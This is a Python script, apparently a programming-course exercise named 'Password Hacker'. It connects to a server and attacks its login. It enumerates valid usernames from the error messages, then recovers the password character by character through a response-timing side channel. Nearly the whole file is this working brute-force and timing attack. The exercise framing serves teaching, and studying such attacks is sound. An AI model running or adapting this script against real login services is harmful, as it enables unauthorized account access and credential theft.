import sys
import json
import time
import itertools

from datetime import datetime
from Connection import connect

login_file_path = "C:\\Users\\longr\\OneDrive\\Документы\\Python\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt"

client_socket = connect((sys.argv[1], int(sys.argv[2])))

with open(login_file_path, "r") as file, open("log.txt", "w") as log:
    # searching for a right login
    # using empty password
    # when combination is right,
    login = ""
    password = list("")
    counter = 0

    for line in file:
        iterator = itertools.product(*([x.lower(), x.upper()] for x in line.strip("\n")))
        for iter in iterator:
            json_request = json.dumps({"login": "".join(iter), "password": ""})
            client_socket.send(json_request.encode())
            dict_response = json.loads(client_socket.recv(1024).decode())
            if "Wrong login" not in dict_response["result"]:
                log.write(str(json_request) + " ")
                log.writelines(str(dict_response) + "\n")
            if "Wrong password" in dict_response["result"]:
                login = "".join(iter)
                break

    # searching for a right password
    # for infinite number of symbols in password
    while True:
        # searching for the right symbol
        for i in range(48, 126):
            password.append(chr(i))
            json_request = json.dumps({"login": login, "password": "".join(password)})
            start = datetime.now()
            client_socket.send(json_request.encode())
            dict_response = json.loads(client_socket.recv(1024).decode())
            end = datetime.now()
            total = end - start
            log.write(str(json_request) + " ")
            log.write(dict_response["result"] + "\n")
            log.write("total: " + str((end - start).total_seconds()) + "\n")
            if "success" in dict_response["result"]:
                print(json_request)
                client_socket.close()
                exit(0)
            elif "Wrong password" in dict_response["result"] and (end - start).total_seconds() >= 0.1:
                counter += 1
                break
            else:
                password = password[:-1]